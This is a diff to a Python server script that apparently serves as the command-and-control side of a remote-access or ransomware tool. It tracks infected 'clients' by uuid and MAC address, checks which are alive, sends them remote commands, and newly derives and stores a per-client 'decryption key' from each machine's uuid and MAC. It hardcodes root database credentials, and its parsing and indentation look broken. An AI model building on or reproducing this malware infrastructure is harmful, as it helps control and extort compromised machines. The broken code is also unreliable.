@@ -1,11 +1,72 @@
 #!/usr/bin/env python
-# coding: utf-8
+# encoding: utf-8
 
 import socket
 import threading
 import MySQLdb
+import base64
+import string
+import codecs
 import time
 from time import gmtime, strftime
+
+def check_aes_key():
+	# Check if a client don't have is decryption key in the database. If not, generate it.
+	db = MySQLdb.connect("localhost","root","toor","clients")
+        cursor = db.cursor()
+        cursor.execute( """SELECT id FROM clients.clients WHERE aes_key = 'key'""")
+        rows = cursor.fetchall()
+        db.close()
+
+	if str(rows) == "()":
+		print("[+] All the clients keys are up to date")
+	else:
+		chaine = str(rows)
+		chaine1 = chaine.replace("(","").replace(")","").replace("L,","").replace(" ","")
+		for id in chaine1.split(","):
+			calc_aes_key(id)
+
+def calc_aes_key(iden):
+	# Get the AES key for a specific client (from uuid and mac adress) then add it into the database
+	array = []
+	db = MySQLdb.connect("localhost","root","toor","clients")
+        cursor = db.cursor()
+	cursor.execute( """SELECT uuid, mac FROM clients.clients WHERE id = %s""",([str(iden)]))
+        rows = cursor.fetchall()
+        db.close()
+
+	if str(rows) == "()":
+		#print("[-] Sorry, this client does not exist ... Check manually in the database if you have a doubt")
+		pass
+	else:
+		pass
+
+	for items in rows:
+		element = str(items)
+
+                for elem in element.split(','):
+                        array.append(elem)
+
+	uuid = str(array)[4:40]
+	mac = str(array)[47:60]
+
+	key_part1 = str(base64.b64encode(str(uuid).encode("utf-8")))
+	key_part2 = ''
+	key_part3 = ''
+	for numbers in mac:
+		key_part2 += str(string.ascii_lowercase[int(numbers)])
+		key_part3 = codecs.encode(key_part2, 'rot-13')
+
+	key = str(key_part1) + str(key_part3)
+
+	db = MySQLdb.connect("localhost","root","toor","clients")
+        cursor = db.cursor()
+	cursor.execute("""UPDATE clients.clients SET aes_key = %s WHERE id = %s""",([key],[str(iden)]))
+        db.commit()
+	db.close()
+
+	#print("[+] AES key generate")
+
 
 def check_alive():
 	alive = []
@@ -18,6 +79,8 @@ def check_alive():
         cursor.execute( """SELECT uuid, last_alive FROM clients.clients WHERE status = 'Alive'""")
         rows = cursor.fetchall()
 	db.close()
+
+	check_aes_key()
 
 	if str(rows) == "()":
 		print("[WARNING] All the clients seems down !")
@@ -66,7 +129,8 @@ def check_alive():
 
 				db = MySQLdb.connect("localhost","root","toor","clients")
                                 cursor = db.cursor()
-                                # Init connexion à la BDD				Hours_diff = True
+                                # Init connexion à la BDD
+				Hours_diff = True
 
 				if str(local_date_prefixe) != str(remote_date_prefixe):
 				# Si le client ne s'est pas connecté depuis plus d'1h ou plus
@@ -91,6 +155,8 @@ def check_alive():
                                         print("[+] Client seems down : " + str(uuid))
                                         db.close()
                                         # Update le status du client à 'Down'
+
+					# Check for the AES keys
 
 def send_cmd(remote_cmd,remote_client):
 	# Need to take two args : The remote command and the remote host to interact with
@@ -131,8 +197,11 @@ def who_is_alive():
 	print("[+] There is " + str(nb_elems) + " connected clients : ")
 
 	if nb_elems == 1:
-		chaine = str(result[1]) + " : " + str(result[2])
-                print("[" + str(result[a]) + "] " + chaine)
+		for result in rows:
+                        for x in range (0,nb_elems):
+                                chaine = str(result[1]) + " : " + str(result[2])
+                                print("[" + str(result[0]) + "] " + chaine)
+                print(" ")
 
 	else:
 		for result in rows:
@@ -167,14 +236,14 @@ def who_is_alive_connected():
 
 	if nb_elems == 0:
 		print("[-] All clients seems down")
-
+		print(" ")
 
 	elif nb_elems == 1:
 		for result in rows:
-			for x in range (0,nb_elems-1):
+			for x in range (0,nb_elems):
 				chaine = str(result[1]) + " : " + str(result[2])
                 		print("[" + str(result[0]) + "] " + chaine)
-
+		print(" ")
 	else:
         	for result in rows:
 	                for x in range (0,nb_elems-1):
